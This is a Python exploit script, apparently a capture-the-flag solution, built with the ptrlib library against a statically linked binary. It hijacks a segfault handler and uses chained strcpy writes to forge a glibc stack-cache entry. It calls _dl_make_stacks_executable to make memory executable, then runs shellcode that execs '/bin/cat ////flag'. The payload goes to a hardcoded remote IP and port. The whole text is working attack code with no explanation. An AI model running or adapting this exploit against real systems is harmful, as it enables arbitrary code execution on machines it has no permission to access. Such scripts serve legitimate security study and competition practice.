from ptrlib import *
import sys

shellcode = b'\xf3\x0f\x1e\xfaH1\xd2RH\xbf/bin/catWT_RH\xbe////flagVT^RVWT^RTZj;X\x0f\x05'

msg_addr = 0x47fab9
puts_addr = 0x405470
exit_addr = 0x404e60
stack_chk_fail_addr = 0x41bb40
strcpy_addr = 0x468ce0
signal_addr = 0x4045d0
sigaction_addr = 0x404690
main_addr = 0x40190d
g_buf_addr = 0x4abb20
dl_pagesize_addr = 0x4ab118
dl_stack_cache_addr = 0x4b0b00
dl_make_stacks_executable_addr = 0x459200
buffer_addr = 0x4B1841

fake_cache_addr = buffer_addr
arg_addr = fake_cache_addr + 125 * 8
shellcode_addr = arg_addr + 8

def gen_segv_block(func, arg1, arg2):
  block = b''
  block += b'A' * 16
  block += b'B' * 8
  block += p64(func)
  block += p64(arg2)
  block += p64(arg1)
  block += b'C' * 16
  assert not b'\n' in block
  block += b'\n'

  return block

def halt():
  return b'\n' + gen_segv_block(stack_chk_fail_addr, 0, 0)

def copy_payload(dst_addr, payload):
  ret = b''
  
  prev = 0
  idx = 0
  while idx < len(payload):
    buffer = b''

    while idx < len(payload):
      buffer += payload[idx:idx+1]
      if len(buffer) >= 254 or payload[idx] == 0x0a or payload[idx] == 0x0:
        break

      idx += 1

    if buffer[-1:] != b'\n':
      buffer += b'\n'
    
    ret += buffer
    ret += gen_segv_block(strcpy_addr, dst_addr+prev, g_buf_addr)

    idx += 1
    prev = idx

  return ret

payload = b''

g_buf = b''
g_buf += p64(main_addr)
g_buf += p64(0)
g_buf += b'\x00' * 0x78
g_buf += p32(0x40000000)
assert not b'\n' in g_buf
payload += g_buf + b'\n'
payload += gen_segv_block(sigaction_addr, 11, g_buf_addr)

payload += copy_payload(fake_cache_addr, p64(dl_stack_cache_addr))
payload += copy_payload(fake_cache_addr + 122 * 8, p64(shellcode_addr & ~0xfff))
payload += copy_payload(fake_cache_addr + 123 * 8, p64(0x1000))
payload += copy_payload(shellcode_addr, shellcode)
payload += copy_payload(dl_pagesize_addr, p64(0))
payload += copy_payload(dl_stack_cache_addr, p64(fake_cache_addr))

payload += b'\n' + gen_segv_block(dl_make_stacks_executable_addr, arg_addr, 0)
payload += b'\n' + gen_segv_block(shellcode_addr, 0, 0)
#payload += b'\n' + gen_segv_block(puts_addr, msg_addr, 0)
payload += b'\n' + gen_segv_block(exit_addr, 0, 0)
#payload += halt()

p = Socket('52.165.26.180', 8810)
p.send(payload)
print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))

#sys.stdout.buffer.write(payload)
